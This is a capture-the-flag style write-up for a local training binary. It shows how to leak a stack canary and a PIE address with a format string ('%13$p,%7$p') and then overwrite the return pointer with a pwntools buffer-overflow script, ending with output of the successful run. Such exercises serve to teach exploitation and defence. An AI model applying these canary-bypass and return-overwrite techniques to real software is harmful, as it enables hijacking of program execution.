# 07_ret_overwrite_pieWcanary_leak Writeup

## Steps:
1. Run chall. Notice in this one PIE is enabled and has a canary that needs to be leaked. This is similar to 05 with a leak but PIE is enabled.
```
$ ./chall 

Your goal is to modify the return pointer @ 0x7ffdc4a05008, to a function called 'win' in the binary.

This binary has PIE enabled and a canary, you must bypass both via a leak. You can leak both in one shot.
Especially if you have a good understanding of format strings.

0x7ffdc4a04fe0: 0x0000000000000000 0x0000000000000000 
0x7ffdc4a04ff0: 0x0000000000000000 *****REDACTED*****
0x7ffdc4a05000: 0x0000000000000001 0x00007f564248bca8 

Enter your name: AAAA
Hello, AAAA. Good luck!


Enter input: AAAA

0x7ffdc4a04fe0: 0x0000000a41414141 0x0000000000000000 
0x7ffdc4a04ff0: 0x0000000000000000 *****REDACTED*****
0x7ffdc4a05000: 0x0000000000000001 0x00007f564248bca8 

You failed to overwrite the return pointer and canary.
```
2. Using gdb gef, identify which stack addresses hold the `canary` and the `return pointer`

```
gef➤  canary
[+] The canary of process 95107 is at 0x7ffff7dad768, value is 0x1c0f98ad999f1f00
gef➤  x/20gx $rsp
0x7fffffffdc50: 0x0000000000000000      0x0000555555558068
0x7fffffffdc60: 0xffffffffffffffff      0xffffffffffffffff
0x7fffffffdc70: 0x0000000000000000      0x0000000000000000
0x7fffffffdc80: 0x0000000000000000      0x1c0f98ad999f1f00
0x7fffffffdc90: 0x0000000000000001      0x00007ffff7dd9ca8
0x7fffffffdca0: 0x00007fffffffdd90      0x0000555555555637
0x7fffffffdcb0: 0x0000000155554040      0x00007fffffffdda8
0x7fffffffdcc0: 0x00007fffffffdda8      0xee4afa5fcbd4e049
0x7fffffffdcd0: 0x0000000000000000      0x00007fffffffddb8
0x7fffffffdce0: 0x00007ffff7ffd000      0x0000000000000000
```
- Notice the canary is at `13`
- `info fun win` gives us `0x0000555555555619  win` and stack `7` is `0x0000555555558068`, so `0x8068 - 0x5619 = 0x2a4f` is the offset

    **Note: This can also be done by leaking stack 17, which containts the address of main (the offset would just differ)**
  
3. Write a format string that leaks the 7th and 13th stack values
4. Create the payload, similar to previous problems
- 24 bytes of garbage to reach canary
- address of `canary`, stack 13
- 8 bytes of garbage to reach return pointer
- address of `win`, stack 7 minus offset
```
from pwn import *

target = process("./chall")

target.sendline(b"%13$p,%7$p")
target.recvuntil("Hello, 0x")
canary = target.recvuntil(",0x")[:-3]
hint = target.recvuntil(".")[:-1]
print("hint",hint)
print("canary",canary)

win = int(hint, 16) - 0x2A4F
canary = int(canary,16)


payload = b"A" * 24
payload += p64(canary)
payload += b"B" * 8
payload += p64(win)

target.sendline(payload)

s = target.recvall().decode()
print(s)
```

## Solution:
```
$ python3 exploit.py 
[+] Starting local process './chall': pid 102732
/home/kali/Binex-Writeups/binex_tuts/07_ret_overwrite_pieWcanary_leak/exploit.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.recvuntil("Hello, 0x")
/home/kali/Binex-Writeups/binex_tuts/07_ret_overwrite_pieWcanary_leak/exploit.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  canary = target.recvuntil(",0x")[:-3]
/home/kali/Binex-Writeups/binex_tuts/07_ret_overwrite_pieWcanary_leak/exploit.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  hint = target.recvuntil(".")[:-1]
hint b'55a500a5e068'
canary b'272ef710f8323f00'
[+] Receiving all data: Done (313B)
[*] Process './chall' stopped with exit code 0 (pid 102732)
 Good luck!


Enter input: 
0x7fff6fbac300: 0x4141414141414141 0x4141414141414141 
0x7fff6fbac310: 0x4141414141414141 *****REDACTED*****
0x7fff6fbac320: 0x4242424242424242 0x000055a500a5b619 

Congrats, you successuly changed execution flow!
```
